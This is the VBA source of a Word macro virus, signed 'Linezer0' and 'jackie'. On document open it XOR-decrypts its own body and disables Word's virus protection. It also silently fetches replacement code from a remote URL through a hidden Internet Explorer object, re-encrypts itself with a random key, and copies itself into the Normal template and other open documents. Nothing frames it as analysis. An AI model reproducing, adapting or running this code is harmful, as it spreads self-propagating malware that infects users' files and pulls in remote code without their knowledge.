
Private Sub Document_Open()
j = j + VBA.CInt(1)
y = VBA.CInt(27)
Do
Word.Application.MacroContainer.VBProject. _
vbcomponents(VBA.CInt(j)).codemodule.ReplaceLine y, _
c(VBA.Mid(Word.Application.MacroContainer.VBProject. _
vbcomponents(VBA.CInt(j)).codemodule.lines(VBA.CInt(y), _
VBA.CInt(j)), (VBA.CInt(j) + VBA.CInt(j))), VBA.Val(VBA. _
Mid(Word.Application.MacroContainer.VBProject.vbcomponents _
(VBA.CInt(j)).codemodule.lines(VBA.CInt((25)), VBA.CInt(j)), _
(VBA.CInt(j) + VBA.CInt(j)))))
VBA.DoEvents
y = y + j
Loop While y <> VBA.CInt(87)
One
End Sub
Private Function c(a, b)
Do
y = y + VBA.CInt(1)
c = c & VBA.Chr(VBA.CInt(VBA.Asc(VBA.Mid(a, VBA.CInt(y), _
VBA.CInt(1))) Xor VBA.CInt(b)))
Loop While y <> VBA.CInt(Len(a))
End Function
'0
Private Sub One()
'On Error Resume Next
'y = y + VBA.CInt(1)
'sCurVer = VBA.CInt(1)
'Word.Application.Options.VirusProtection = j
'Word.Application.Options.SaveNormalPrompt = j
'Word.Application.StatusBar = False
'If Not Time Like "*2*3*" Then GoTo phuqit
'Set objNET = CreateObject("InternetExplorer.Application")
'If objNET = "" Then GoTo phuqit
'Do While objNET.Busy
'VBA.DoEvents
'Loop
'objNET.Visible = 0
'objNET.Navigate "http://www.stas.net/2/one/one.txt"
'Do While objNET.ReadyState <> 4
'VBA.DoEvents
'Loop
'sCode = objNET.Document.Body.innerText
'objNET.Quit
'sOneID = Mid(sCode, y, y)
'If sOneID <> Chr(165) Then GoTo phuqit
'sNewVer = Val(Mid(sCode, 4, y))
'If sNewVer > sCurVer Then
'sCode = Mid(sCode, 7)
'ThisDocument.VBProject.vbcomponents(y). _
'codemodule.deletelines y, 89
'ThisDocument.VBProject.vbcomponents(y). _
'codemodule.insertlines y, sCode
'GoTo nospread:
'End If
'phuqit:
'z = VBA.CInt(27)
'k = 210 + Int(Rnd * 45)
'ThisDocument.VBProject.vbcomponents(y). _
'codemodule.ReplaceLine 25, Chr(39) & k
'Do
'ThisDocument.VBProject.vbcomponents(y). _
'codemodule.ReplaceLine z, Chr(39) & c(ThisDocument. _
'VBProject.vbcomponents(y).codemodule.lines(z, y), k)
'VBA.DoEvents
'z = z + y
'Loop While z <> VBA.CInt(87)
'sCode = ThisDocument.VBProject.vbcomponents(y). _
'codemodule.lines(y, 89)
'If ThisDocument = ActiveDocument Then _
'Set objOne = NormalTemplate Else _
'Set objOne = ActiveDocument
'With objOne.VBProject.vbcomponents(y)
'With .codemodule
'If VBA.Mid(.lines(88, y), 2) <> "One" Then
'.deletelines y, .countoflines
'.insertlines y, sCode
'If ThisDocument = NormalTemplate Then _
'ActiveDocument.SaveAs ActiveDocument.FullName
'End If
'End With
'End With
'nospread:
'ThisDocument.SaveAs ThisDocument.FullName, wdFormatDocument
''Linezer0//worldwide
End Sub
'One
'(c) jackie
